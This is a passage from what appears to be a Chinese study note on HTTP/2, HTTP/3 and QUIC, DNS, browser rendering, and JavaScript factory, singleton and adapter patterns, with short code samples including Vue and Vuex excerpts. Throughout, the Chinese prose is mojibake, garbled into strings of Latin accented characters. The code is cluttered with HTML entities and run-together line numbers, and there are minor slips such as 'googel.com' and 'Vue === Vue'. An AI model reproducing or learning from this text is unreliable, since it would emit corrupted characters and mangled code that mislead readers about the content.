è¾“æ•°æ®çš„æ—¶å€™ï¼Œä¸¤ç«¯ä½¿ç”¨å¯¹ç§°åŠ å¯†çš„æ–¹å¼è¿›è¡Œé€šä¿¡ã€‚ å…³äºŽ http å®‰å…¨çš„å…·ä½“å¯ä»¥ç‚¹å‡»è¿™é‡Œ HTTP/2 ä»¥åŠ HTTP/3HTTP/2 å¾ˆå¥½çš„è§£å†³äº†å½“ä¸‹æœ€å¸¸ç”¨çš„ HTTP/1 æ‰€å­˜åœ¨çš„ä¸€äº›æ€§èƒ½é—®é¢˜ï¼Œåªéœ€è¦å‡çº§åˆ°è¯¥åè®®å°±å¯ä»¥å‡å°‘å¾ˆå¤šä¹‹å‰éœ€è¦åšçš„æ€§èƒ½ä¼˜åŒ–å·¥ä½œï¼Œå½“ç„¶å…¼å®¹é—®é¢˜ä»¥åŠå¦‚ä½•ä¼˜é›…é™çº§åº”è¯¥æ˜¯å›½å†…è¿˜ä¸æ™®éä½¿ç”¨çš„åŽŸå› ä¹‹ä¸€ã€‚ è™½ç„¶ HTTP/2 å·²ç»è§£å†³äº†å¾ˆå¤šé—®é¢˜ï¼Œä½†æ˜¯å¹¶ä¸ä»£è¡¨å®ƒå·²ç»æ˜¯å®Œç¾Žçš„äº†ï¼ŒHTTP/3 å°±æ˜¯ä¸ºäº†è§£å†³ HTTP/2 æ‰€å­˜åœ¨çš„ä¸€äº›é—®é¢˜è€Œè¢«æŽ¨å‡ºæ¥çš„ã€‚ HTTP/2HTTP/2 ç›¸æ¯”å¯¹ HTTP/1 å¯ä»¥è¯´æ˜¯å¤§å¹…åº¦æé«˜äº†ç½‘é¡µçš„æ€§èƒ½ã€‚ åœ¨ HTTP/1 ä¸ºäº†æ€§èƒ½è€ƒè™‘ï¼Œæˆ‘ä»¬ä¼šå¼•å…¥é›ªç¢§å›¾ã€å°†å°å›¾å†…è”ã€ä½¿ç”¨å¤šä¸ªåŸŸåç­‰ç­‰çš„æ–¹å¼ã€‚è¿™ä¸€åˆ‡éƒ½æ˜¯å› ä¸ºæµè§ˆå™¨é™åˆ¶äº†åŒä¸€ä¸ªåŸŸåä¸‹çš„è¯·æ±‚æ•°é‡ï¼ˆChrome ä¸‹ä¸€èˆ¬æ˜¯é™åˆ¶å…­ä¸ªè¿žæŽ¥ï¼‰ï¼Œå½“é¡µé¢ä¸­éœ€è¦è¯·æ±‚å¾ˆå¤šèµ„æºçš„æ—¶å€™ï¼Œé˜Ÿå¤´é˜»å¡žï¼ˆHead of line blockingï¼‰ä¼šå¯¼è‡´åœ¨è¾¾åˆ°æœ€å¤§è¯·æ±‚æ•°é‡æ—¶ï¼Œå‰©ä½™çš„èµ„æºéœ€è¦ç­‰å¾…å…¶ä»–èµ„æºè¯·æ±‚å®ŒæˆåŽæ‰èƒ½å‘èµ·è¯·æ±‚ã€‚ åœ¨ HTTP/2 ä¸­å¼•å…¥äº†å¤šè·¯å¤ç”¨çš„æŠ€æœ¯ï¼Œè¿™ä¸ªæŠ€æœ¯å¯ä»¥åªé€šè¿‡ä¸€ä¸ª TCP è¿žæŽ¥å°±å¯ä»¥ä¼ è¾“æ‰€æœ‰çš„è¯·æ±‚æ•°æ®ã€‚å¤šè·¯å¤ç”¨å¾ˆå¥½çš„è§£å†³äº†æµè§ˆå™¨é™åˆ¶åŒä¸€ä¸ªåŸŸåä¸‹çš„è¯·æ±‚æ•°é‡çš„é—®é¢˜ï¼ŒåŒæ—¶ä¹ŸæŽ¥æ›´å®¹æ˜“å®žçŽ°å…¨é€Ÿä¼ è¾“ï¼Œæ¯•ç«Ÿæ–°å¼€ä¸€ä¸ª TCP è¿žæŽ¥éƒ½éœ€è¦æ…¢æ…¢æå‡ä¼ è¾“é€Ÿåº¦ã€‚ å¤§å®¶å¯ä»¥é€šè¿‡ è¯¥é“¾æŽ¥ æ„Ÿå—ä¸‹ HTTP/2 æ¯” HTTP/1 åˆ°åº•å¿«äº†å¤šå°‘ã€‚ äºŒè¿›åˆ¶ä¼ è¾“HTTP/2 ä¸­æ‰€æœ‰åŠ å¼ºæ€§èƒ½çš„æ ¸å¿ƒåœ¨äºŽæ­¤ï¼Œåœ¨ä¹‹å‰çš„ HTTP ç‰ˆæœ¬ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡æ–‡æœ¬çš„æ–¹å¼ä¼ è¾“æ•°æ®ï¼Œåœ¨ HTTP/2 ä¸­å¼•å…¥äº†æ–°çš„ç¼–ç æœºåˆ¶ï¼Œæ‰€æœ‰çš„ä¼ è¾“æ•°æ®éƒ½ä¼šè¢«åˆ†å‰²ï¼Œå¹¶é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼ç¼–ç ã€‚ å¤šè·¯å¤ç”¨åœ¨ HTTP/2 ä¸­æœ‰ä¸¤ä¸ªéžå¸¸é‡è¦çš„æ¦‚å¿µï¼Œåˆ†åˆ«æ˜¯ å¸§ï¼ˆframeï¼‰å’Œ æµ ï¼ˆstreamï¼‰ å¸§ä»£è¡¨ç€æœ€å°çš„æ•°æ®å•ä½ï¼Œæ¯ä¸ªå¸§éƒ½ä¼šæ ‡è¯†å‡ºè¯¥å¸§å±žäºŽå“ªä¸ªæµï¼Œæµä¹Ÿå°±æ˜¯å¤šä¸ªå¸§ç»„æˆçš„æ•°æ®æµ å¤šè·¯å¤ç”¨ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ª TCP è¿žæŽ¥ä¸­å¯ä»¥å­˜åœ¨å¤šæ¡æµã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å¯ä»¥å‘é€å¤šä¸ªè¯·æ±‚ï¼Œå¯¹ç«¯å¯ä»¥é€šè¿‡å¸§ä¸­çš„æ ‡è¯†çŸ¥é“å±žäºŽå“ªä¸ªè¯·æ±‚ã€‚é€šè¿‡è¿™ä¸ªæŠ€æœ¯ï¼Œå¯ä»¥é¿å… HTTP æ—§ç‰ˆæœ¬ä¸­çš„å¯¹å¤´é˜»å¡žçš„é—®é¢˜ï¼Œæžå¤§æé«˜äº†ä¼ è¾“çš„æ€§èƒ½ã€‚ Header åŽ‹ç¼©åœ¨ HTTP/1 ä¸­ä½¿ç”¨æ–‡æœ¬çš„å½¢å¼ä¼ è¾“ headerï¼Œåœ¨ header æºå¸¦ cookie çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½æ¯æ¬¡éƒ½éœ€è¦é‡å¤ä¼ è¾“å‡ ç™¾åˆ°å‡ åƒå­—èŠ‚ã€‚ åœ¨ HTTP/2 ä¸­ä½¿ç”¨ HPACK åŽ‹ç¼©æ ¼å¼å¯¹ä¼ è¾“çš„ header è¿›è¡Œç¼–ç ï¼Œå‡å°‘äº† header çš„å¤§å°ã€‚å¹¶åœ¨ä¸¤ç«¯ç»´æŠ¤äº†ç´¢å¼•è¡¨ï¼Œç”¨äºŽè®°å½•å‡ºçŽ°è¿‡çš„ headerã€‚åŽé¢åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¯ä»¥ä¼ è¾“ä»¥åŠè®°å½•è¿‡çš„ header çš„é”®åï¼Œå¯¹ç«¯æ”¶åˆ°çš„æ•°æ®åŽå°±å¯ä»¥é€šè¿‡é”®åæ‰¾åˆ°å¯¹åº”çš„å€¼ æœåŠ¡ç«¯ Pushåœ¨ HTTP/2 ä¸­ï¼ŒæœåŠ¡ç«¯å¯ä»¥åœ¨å®¢æˆ·ç«¯æŸä¸ªè¯·æ±‚åŽï¼Œä¸»åŠ¨æŽ¨é€å…¶ä»–èµ„æº æŸäº›èµ„æºå®¢æˆ·ç«¯æ˜¯ä¸€å®šä¼šè¯·æ±‚çš„ï¼Œè¿™æ—¶å€™å¯ä»¥é‡‡ç”¨æœåŠ¡ç«¯ push çš„æŠ€æœ¯ï¼Œæå‰ç»™å®¢æˆ·ç«¯æŽ¨é€å¿…è¦çš„èµ„æºï¼Œè¿™æ ·å°±å¯ä»¥ç›¸å¯¹å‡å°‘ä¸€ç‚¹å»¶è¿Ÿæ—¶é—´ã€‚å½“ç„¶åœ¨æµè§ˆå™¨å…¼å®¹çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨ prefetch HTTP/3åº•å±‚çš„ TCP åè®®å¯¼è‡´ HTTP/2 ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºä½¿ç”¨äº†å¤šè·¯å¤ç”¨ï¼Œä¸€èˆ¬æ¥è¯´åŒä¸€ä¸ªåŸŸåä¸‹é¢åªéœ€è¦ä¸€ä¸ª TCP è¿žæŽ¥ã€‚å½“è¿™ä¸ªè¿žæŽ¥ä¸­å‡ºçŽ°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œå°±ä¼šå¯¼è‡´ HTTP/2 çš„è¡¨çŽ°ä¸å¦‚ HTTP/1 åœ¨ä¸¢åŒ…çš„æƒ…å†µä¸‹ï¼Œæ•´ä¸ª TCP éƒ½è¦å¼€å§‹ç­‰å¾…é‡ä¼ ï¼Œå°±å¯¼è‡´äº†åŽé¢çš„æ‰€æœ‰çš„æ•°æ®éƒ½ä¼šè¢«é˜»å¡žã€‚ä½†æ˜¯å¯¹äºŽ HTTP/1 æ¥è¯´å¯ä»¥å¼€å¯å¤šä¸ª TCP è¿žæŽ¥ï¼Œå‡ºçŽ°è¿™ç§æƒ…å†µåªä¼šå½±å“ä¸€ä¸ªè¿žæŽ¥ï¼Œå‰©ä½™çš„ TCP è¿žæŽ¥å¯ä»¥æ­£å¸¸ä¼ è¾“æ•°æ® è¿™ä¸ªåè®®æ˜¯ç”±æ“ä½œç³»ç»Ÿå®žçŽ°çš„ï¼Œå¦‚æžœè¦åŽ»ä¿®æ”¹ TCP åè®®çœ‹èµ·æ¥ä¸æ€Žä¹ˆçŽ°å®žã€‚ åŸºäºŽè¿™ä¸ªåŽŸå› ï¼ŒGoogle å°±æ›´èµ·ç‚‰ç¶æžäº†ä¸€ä¸ªåŸºäºŽ UDP åè®®çš„ QUIC åè®®ï¼Œå¹¶ä¸”ä½¿ç”¨åœ¨äº† HTTP/3 ä¸Šï¼Œ HTTP/3 ä¹‹å‰åä¸º HTTP-over-QUIC QUICUDP åè®®è™½ç„¶æ•ˆçŽ‡å¾ˆé«˜ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯é‚£ä¹ˆçš„å¯é .QUIC æ˜¯åŸºäºŽ UDP ,åœ¨åŽŸç”Ÿçš„åŸºç¡€ä¸Šæ–°å¢žäº†å¾ˆå¤šåŠŸèƒ½ï¼Œæ¯”å¦‚å¤šè·¯å¤ç”¨ã€0-RTTã€ä½¿ç”¨ TLS1.3 åŠ å¯†ã€æµé‡æŽ§åˆ¶ã€æœ‰åºäº¤ä»˜ã€é‡ä¼ ç­‰åŠŸèƒ½ã€‚ å¤šè·¯å¤ç”¨è™½ç„¶ HTTP/2 æ”¯æŒå¤šè·¯å¤ç”¨ï¼Œä½†æ˜¯ TCP åè®®ç»ˆç©¶æ˜¯æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½çš„ã€‚QUIC å°±åŽŸç”Ÿå®žçŽ°äº†è¿™ä¸ªåŠŸèƒ½ï¼Œå¹¶ä¸”ä¼ è¾“çš„å•ä¸ªæ•°æ®æµå¯ä»¥ä¿è¯æœ‰åºäº¤ä»˜ä½†ä¸ä¼šå½±å“å…¶ä»–çš„æ•°æ®æµï¼Œè¿™æ ·çš„æŠ€æœ¯å°±è§£å†³äº†ä¹‹å‰çš„ TCP å­˜åœ¨çš„é—®é¢˜ã€‚ å¹¶ä¸” QUIC åœ¨ç§»åŠ¨ç«¯ä¼šæ¯” TCP å¥½ï¼Œå› ä¸º TCP æ˜¯åŸºäºŽ IP å’Œç«¯å£åŽ»è¯†åˆ«è¿žæŽ¥çš„ï¼Œè¿™ç§æ–¹å¼åœ¨å¤šå˜çš„ç§»åŠ¨ç«¯ç½‘ç»œçŽ¯å¢ƒä¸‹æ˜¯å¾ˆè„†å¼±çš„ã€‚ä½†æ˜¯å› ä¸º QUIC æ˜¯é€šè¿‡ ID çš„æ–¹å¼åŽ»è¯†åˆ«ä¸€ä¸ªè¿žæŽ¥çš„ï¼Œä¸ä¼šéšç€ç½‘ç»œçš„å˜åŒ–è€Œå˜åŒ–ï¼Œå¯ä»¥è¿…é€Ÿé‡è¿žä¸Šã€‚ 0-RRTé€šè¿‡ä½¿ç”¨ç±»ä¼¼ TCP çš„å¿«é€Ÿæ‰“å¼€çš„æŠ€æœ¯ï¼Œç¼“å­˜å½“å‰ä¼šè¯çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨ä¸‹æ¬¡æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œåªéœ€è¦å°†ä¹‹å‰çš„ç¼“å­˜ä¼ é€’ç»™æœåŠ¡ç«¯éªŒè¯é€šè¿‡å°±å¯ä»¥è¿›è¡Œä¼ è¾“äº†ã€‚ çº é”™æœºåˆ¶å‡å¦‚è¯´è¿™æ¬¡æˆ‘è¦å‘é€ä¸‰ä¸ªåŒ…ï¼Œé‚£ä¹ˆåè®®ä¼šç®—å‡ºè¿™ä¸‰ä¸ªåŒ…çš„å¼‚æˆ–å€¼å¹¶å•ç‹¬å‘å‡ºä¸€ä¸ªæ ¡éªŒåŒ…ï¼Œä¹Ÿå°±æ˜¯æ€»å…±å‘å‡ºäº†å››ä¸ªåŒ…ã€‚å½“å‡ºçŽ°å…¶ä¸­çš„éžæ ¡éªŒä¸¢åŒ…çš„ æƒ…å†µçš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å¦å¤–ä¸‰ä¸ªåŒ…è®¡ç®—å‡ºä¸¢å¤±çš„æ•°æ®åŒ…çš„å†…å®¹ã€‚ å½“ç„¶è¿™ç§æŠ€æœ¯åªèƒ½ä½¿ç”¨åœ¨ä¸¢å¤±ä¸€ä¸ªåŒ…çš„æƒ…å†µä¸‹ï¼Œå¦‚æžœå‡ºçŽ°ä¸¢å¤±å¤šä¸ªåŒ…å°±ä¸èƒ½ä½¿ç”¨çº é”™æœºåˆ¶äº†ï¼Œåªèƒ½ä½¿ç”¨é‡ä¼ çš„æ–¹å¼äº†ã€‚ å°ç»“ HTTP/2 é€šè¿‡å¤šè·¯å¤ç”¨ã€äºŒè¿›åˆ¶æµã€header åŽ‹ç¼©ç­‰æŠ€æœ¯ï¼Œæžå¤§æé«˜äº†æ€§èƒ½ï¼Œä½†æ˜¯è¿˜æ˜¯å­˜åœ¨ç€é—®é¢˜ QUIC åŸºäºŽ UDP å®žçŽ°ï¼Œæ˜¯ HTTP/3 ä¸­åº•å±‚æ”¯æ’‘åè®®ï¼Œè¯¥åè®®åŸºäºŽ UDPï¼Œè€Œä¸”æ‹¿äº† TCP ä¸­çš„ç²¾åŽï¼Œå®žçŽ°äº†åˆå¿«æœ‰å¯é çš„åè®® å…³äºŽ HTTP/3 æ›´å¤šç‚¹å‡»è¿™é‡Œ è¾“å…¥ URL åˆ°é¡µé¢æ¸²æŸ“çš„æ•´ä¸ªè¿‡ç¨‹é¦–å…ˆæ˜¯ DNS æŸ¥è¯¢ï¼Œå¦‚æžœè¿™ä¸€æ­¥åšåˆ°äº†æ™ºèƒ½ DNS è§£æžçš„è¯ï¼Œä¼šæä¾›é€Ÿåº¦æœ€å¿«çš„ IP åœ°å€å›žæ¥ DNSDNS çš„ä½œç”¨å°±æ˜¯é€šè¿‡åŸŸåæŸ¥è¯¢åˆ°å…·ä½“çš„ IP åœ°å€ å› ä¸º IP å­˜åœ¨æ•°æ®å’Œè‹±æ–‡çš„ç»„åˆï¼ˆIPv6ï¼‰ï¼Œä¸åˆ©äºŽè®°å¿†ï¼Œæ‰€ä»¥å°±å‡ºçŽ°äº†åŸŸåï¼Œå¯ä»¥æŠŠå®ƒçœ‹æˆæŸä¸ª IP åœ°å€çš„åˆ«åï¼ŒDNS å°±æ˜¯é€šè¿‡è¿™ä¸ªåˆ«ååŽ»æŸ¥è¯¢çœŸæ­£çš„åå­—æ˜¯ä»€ä¹ˆ åœ¨ TCP æ¡æ‰‹ä¹‹å‰ä»¥åŠå…ˆè¿›è¡Œäº† DNS æŸ¥è¯¢ï¼Œè¿™ä¸ªæŸ¥è¯¢æ˜¯æ“ä½œç³»ç»Ÿè‡ªå·±åšçš„ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® www.googel.com çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œä»¥ä¸‹çš„æ“ä½œï¼š æ“ä½œç³»ç»Ÿä¼šé¦–å…ˆåœ¨æœ¬åœ°ç¼“å­˜ä¸­æŸ¥è¯¢ IP æ²¡æœ‰çš„è¯å°±ä¼šåŽ»ç³»ç»Ÿé…ç½®çš„ DNS æœåŠ¡å™¨ä¸­æŸ¥è¯¢ å¦‚æžœè¿™æ—¶å€™è¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šç›´æŽ¥åŽ» DNS æ ¹æœåŠ¡å™¨æŸ¥è¯¢ï¼Œè¿™ä¸€æ­¥æŸ¥è¯¢ä¼šæ‰¾å‡ºè´Ÿè´£ comè¿™ä¸ªåŸŸåçš„æœåŠ¡å™¨ ç„¶åŽåŽ»è¯¥æœåŠ¡å™¨æŸ¥è¯¢ googleè¿™ä¸ªäºŒçº§åŸŸå æŽ¥ä¸‹æ¥æ˜¯ä¸‰çº§åŸŸåçš„æŸ¥è¯¢ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬è‡ªå·±é…ç½®çš„ï¼Œå¯ä»¥ç»™ www è¿™ä¸ªåŸŸåé…ç½®ä¸€ä¸ªIP,ç„¶åŽè¿˜å¯ä»¥ç»™åˆ«çš„ä¸‰çº§åŸŸåé…ç½®ä¸€ä¸ª IP ä¸Šé¢æ˜¯DNS è¿­ä»£æŸ¥è¯¢ï¼Œè¿˜æœ‰ä¸€ç§æ ¼å¼é€’å½’æŸ¥è¯¢ï¼ŒåŒºåˆ«å°±æ˜¯å‰è€…æ˜¯ç”±å®¢æˆ·ç«¯åŽ»åšè¯·æ±‚ï¼ŒåŽè€…æ˜¯ç”±ç³»ç»Ÿé…ç½®çš„ DNS æœåŠ¡å™¨åšè¯·æ±‚ï¼Œå¾—åˆ°ç»“æžœå°†æ•°æ®è¿”å›žç»™å®¢æˆ·ç«¯ã€‚ DNS æ˜¯åŸºäºŽ UDP åšçš„æŸ¥è¯¢ æŽ¥ä¸‹æ¥æ˜¯ TCP æ¡æ‰‹åè®®ï¼Œåº”ç”¨å±‚ä¼šä¸‹å‘æ•°æ®ç»™ä¼ è¾“å±‚ï¼Œè¿™é‡Œçš„ TCP åè®®ä¼šæŒ‡æ˜Žä¸¤ç«¯çš„ç«¯å£å·ï¼Œç„¶åŽä¸‹å‘ç»™ç½‘ç»œå±‚ã€‚ç½‘ç»œå±‚çš„ IP åè®®ä¼šç¡®å®š IP åœ°å€ï¼Œå¹¶åˆ¶å®šäº†æ•°æ®ä¼ è¾“ä¸­å¦‚ä½•è·³è½¬è·¯ç”±å™¨ã€‚ç„¶åŽåŒ…ä¼šå†è¢«å°è£…åˆ°æ•°æ®é“¾è·¯å±‚çš„æ•°æ®å¸§ç»“æž„ä¸­ï¼Œæœ€åŽå°±æ˜¯ç‰©ç†å±‚é¢çš„ä¼ è¾“äº†ã€‚ åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼ŒTCP æ¡æ‰‹ç»“æŸåŽï¼Œä¼šè¿›è¡Œ TLS æ¡æ‰‹ï¼Œç„¶åŽå¼€å§‹æ­£å¼çš„ä¼ è¾“æ•°æ®äº†ã€‚ æ•°æ®åœ¨è¿›å…¥æœåŠ¡ç«¯ä¹‹å‰ï¼Œå¯èƒ½è¿˜ä¼šè­¦å‘Šè´Ÿè´£è´Ÿè½½å‡è¡¡çš„æœåŠ¡å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†è¯·æ±‚åˆç†çš„åˆ†å‘åˆ°å¤šæ€æœåŠ¡å™¨ä¸Šé¢ï¼Œè¿™æ—¶å‡è®¾æœåŠ¡ç«¯ä¼šå“åº”ä¸€ä¸ª HTML æ–‡ä»¶ é¦–å…ˆæµè§ˆå™¨ä¼šåˆ¤æ–­çŠ¶æ€ç æ˜¯ä»€ä¹ˆï¼Œå¦‚æžœæ˜¯200 å°±ç»§ç»­è§£æžï¼Œå¦‚æžœæ˜¯ 400 æˆ–è€… 500 çš„è¯å°±ä¼šæŠ¥é”™ï¼Œå¦‚æžœæ˜¯ 300 å°±ä¼šé‡å®šå‘ï¼Œè¿™é‡Œä¼šæœ‰ä¸€ä¸ª é‡å®šå‘è®¡æ•°å™¨ï¼Œé¿å…å¤šæ¬¡çš„é‡å®šå‘ï¼Œè¶…è¿‡æ¬¡æ•°ä¹Ÿä¼šæŠ¥é”™ã€‚ æµè§ˆå™¨å¼€å§‹è§£æžæ–‡ä»¶ï¼Œå¦‚æžœæ˜¯ gzip æ ¼å¼çš„ä¼šå…ˆè§£åŽ‹ä¸€ä¸‹ï¼Œç„¶åŽé€šè¿‡æ–‡ä»¶çš„ç¼–ç æ ¼å¼çŸ¥é“è¯¥å¦‚ä½•å–è§£ç æ–‡ä»¶ã€‚ æ–‡ä»¶è§£ç åŽå°±ä¼šæ­£å¼å¼€å§‹æ¸²æŸ“æµç¨‹ï¼Œå…ˆæ ¹æ® HTML åˆ›å»º DOM æ ‘ï¼Œæœ‰ CSS çš„è¯å°±æ˜¯ CSSOM æ ‘ï¼Œå¦‚æžœé‡åˆ° script æ ‡ç­¾çš„è¯ï¼Œä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨ async æˆ–è€… defer,å‰è€…ä¼šå¹¶è¡Œè¿›è¡Œä¸‹è½½å¹¶æ‰§è¡Œ JS,åŽè€…ä¼šå…ˆä¸‹è½½æ–‡ä»¶ï¼Œç„¶åŽç­‰å¾… HTML è§£æžå®ŒæˆåŽé¡ºåºæ‰§è¡Œã€‚ å¦‚æžœä»¥ä¸Šéƒ½æ²¡æœ‰ï¼Œå°±ä¼šé˜»å¡žä½æ¸²æŸ“æµç¨‹ç›´åˆ° JS æ‰§è¡Œå®Œæ¯•ã€‚é‡åˆ°ä¸‹è½½æ–‡ä»¶å°±ä¼šåŽ»ä¸‹è½½æ–‡ä»¶ï¼Œå¦‚æžœä½¿ç”¨ HTTP/2 åè®®çš„è¯å°±ä¼šæžå¤§æé«˜å¤šå›¾çš„ä¸‹è½½æ•ˆçŽ‡ CSSOM æ ‘ å’Œ DOM æ ‘æž„å»ºå®Œæˆä¹‹åŽä¼šç”Ÿæˆ render æ ‘ï¼Œè¿™ä¸€æ­¥å°±æ˜¯ç¡®å®šé¡µé¢å¸ƒå±€ã€æ ·å¼ç­‰è¯¸å¤šæ–¹é¢çš„ä¸œè¥¿ã€‚ åœ¨ç”Ÿæˆ Render æ ‘çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å°±ä¼šå¼€å§‹è°ƒç”¨ GPU ç»˜åˆ¶ï¼Œåˆæˆå›¾å±‚ï¼Œå°†å†…å®¹æ˜¾ç¤ºåœ¨ å±å¹•ä¸Šäº†ã€‚ å…³äºŽè¿™ä¸ªæµç¨‹ï¼Œæ›´å¤šçš„å¯ä»¥ç‚¹å‡»è¿™é‡Œ è®¾è®¡æ¨¡å¼å…³äºŽå…·ä½“çš„è®¾è®¡æ¨¡å¼æˆ‘æœ‰è¿‡ä¸€äº›ç¬”è®° ä¸‹é¢è¿˜æ˜¯æ ¹æ®ä½œè€…çš„è„šæ­¥æ¥å›žé¡¾è¿™ä¸€ç‚¹çŸ¥è¯†ç‚¹ å·¥åŽ‚æ¨¡å¼æœ‰ä¸€ä»½å¾ˆå¤æ‚çš„ä»£ç éœ€è¦ç”¨æˆ·åŽ»è°ƒç”¨ï¼Œä½†æ˜¯ç”¨æˆ·å¹¶ä¸å…³å¿ƒè¿™äº›ä»£ç æ˜¯æ€Žä¹ˆå®žçŽ°çš„ï¼Œåªéœ€è¦æä¾›ä¸€ä¸ªæŽ¥å£åŽ»è°ƒç”¨ï¼Œç”¨æˆ·åªè´Ÿè´£ä¼ é€’éœ€è¦çš„å‚æ•°ã€‚å‚æ•°çš„ä½¿ç”¨éƒ½åœ¨å†…éƒ¨é€»è¾‘åŽ»å®Œæˆï¼Œä¸æš´éœ²å‡ºæ¥ç»™ç”¨æˆ·ã€‚åªè¦ç»™ç”¨æˆ·è¿”å›žä¸€ä¸ªå®žä¾‹ï¼Œè¿™ç§æž„é€ è¿‡ç¨‹å°±æ˜¯å·¥åŽ‚ã€‚ ç®€è€Œè¨€ä¹‹å°±æ˜¯éšè—äº†åˆ›å»ºå®žä¾‹çš„å¤æ‚åº¦ï¼Œåªéœ€è¦æä¾›ä¸€ä¸ªæŽ¥å£ 12345678910111213141516class Man&#123; constructor(name)&#123; this.name = name &#125; alertName()&#123; alert(this.name) &#125;&#125;class Factory&#123; static create(name)&#123; return new Man(name) &#125;&#125;Factory.create('haha').alertName() Vue æºç ä¸­ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å·¥åŽ‚æ¨¡å¼çš„ä½¿ç”¨ï¼Œæ¯”å¦‚åˆ›å»ºå¼‚æ­¥ç»„ä»¶ 12345678910111213141516171819export function createComponent( Ctor: Class&lt;Component&gt; | Function | Object | void, data: ?VNodeData, context: Component, children: ?Array&lt;VNode&gt;, tag?: string): VNode | Array&lt;VNode&gt; | void &#123; // é€»è¾‘å¤„ç†... const vnode = new VNode( `vue-component-$&#123;Ctor.cid&#125;$&#123;name ? `-$&#123;name&#125;` : &apos;&apos;&#125;`, data, undefined, undefined, undefined, context, &#123; Ctor, propsData, listeners, tag, children &#125;, asyncFactory ) return vnode&#125; åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ createComponent ä¼ å…¥å‚æ•°å°±èƒ½åˆ›å»ºä¸€ä¸ªç»„ä»¶å®žä¾‹ï¼Œä½†æ˜¯åˆ›å»ºè¿™ä¸ªå®žä¾‹æ˜¯å¾ˆå¤æ‚çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå·¥åŽ‚å¸®åŠ©æˆ‘ä»¬éšè—äº†è¿™ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œåªéœ€è¦ä¸€å¥ä»£ç è°ƒç”¨å°±èƒ½å®žçŽ°åŠŸèƒ½ã€‚ å•ä¾‹æ¨¡å¼å•ä¾‹æ¨¡å¼å¾ˆå¸¸ç”¨ï¼Œæ¯”å¦‚å…¨å±€ç¼“å­˜ã€å…¨å±€çŠ¶æ€ç®¡ç†ç­‰ç­‰åªéœ€è¦ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥ä½¿ç”¨å•ä¾‹æ¨¡å¼ å•ä¾‹æ¨¡å¼çš„æ ¸å¿ƒå°±æ˜¯ä¿è¯å…¨å±€åªæœ‰ä¸€ä¸ªå¯¹è±¡å¯ä»¥è®¿é—®ã€‚å› ä¸º JS æ˜¯é—¨æ— ç±»çš„è¯­è¨€ï¼Œæ‰€ä»¥åˆ«çš„è¯­è¨€å®žçŽ°å•ä¾‹çš„æ–¹å¼ä¸èƒ½å¥—å…¥ JS ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ä¸€ä¸ªå˜é‡ç¡®ä¿å€¼åˆ›å»ºä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä¸‹é¢æ˜¯å¦‚ä½•å®žçŽ°å•ä¾‹æ¨¡å¼çš„ä¾‹å­ï¼š 12345678910111213141516class Singleton &#123; constructor() &#123; &#125;&#125;Singleton.getInstance = (function () &#123; let instance; return function () &#123; if (!instance) &#123; instance = new Singleton() &#125; return instance; &#125;&#125;)()let s1 = new Singleton.getInstance();let s2 = new Singleton.getInstance();console.log(s1 === s2); // true åœ¨ Vuex æºç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å•ä¾‹æ¨¡å¼çš„è¿ç”¨ï¼Œè™½ç„¶å®žçŽ°çš„æ–¹å¼ä¸å¤§ä¸€æ ·ï¼Œé€šè¿‡ä¸€ä¸ªå¤–éƒ¨å˜é‡æ¥æŽ§åˆ¶åªå®‰è£…ä¸€æ¬¡ Vuex 123456789let Vue // bind on installexport function install (_Vue)&#123; if(Vue &amp;&amp; Vue === Vue)&#123; // å¦‚æžœå‘çŽ° Vue æœ‰å€¼ï¼Œå°±ä¸é‡æ–°åˆ›å»ºå®žä¾‹äº† return; &#125; Vue = _Vue; applyMixin(Vue)&#125; é€‚é…å™¨æ¨¡å¼é€‚é…å™¨ç”¨æ¥è§£å†³ä¸¤ä¸ªæŽ¥å£ä¸å…¼å®¹çš„æƒ…å†µï¼Œä¸éœ€è¦æ”¹å˜å·²æœ‰çš„æŽ¥å£ï¼Œé€šè¿‡åŒ…è£…ä¸€å±‚çš„æ–¹å¼å®žçŽ°ä¸¤ä¸ªæŽ¥å£çš„æ­£å¸¸åä½œ ç®€å•å®žçŽ°ï¼š 12345678910111213141516class Plug&#123; getName()&#123; return 'æ¸¯ç‰ˆæ’å¤´' &#125;&#125;class Target&#123; constructor()&#123; this.plug = new Plug() &#125; getName()&#123; return this.plug.getName() + ' é€‚é…è½¬äºŒè„šæ’å¤´' &#125;&#125;let target = new Target();target.getName(); // æ¸¯ç‰ˆæ’å¤´ é€‚é…è½¬äºŒè„šæ’å¤´ åœ¨ Vue ä¸­ç»å¸¸ä½¿ç”¨åˆ°é€‚é…å™¨æ¨¡å¼ï¼Œæ¯”å¦‚çˆ¶ç»„ä»¶ä¼ 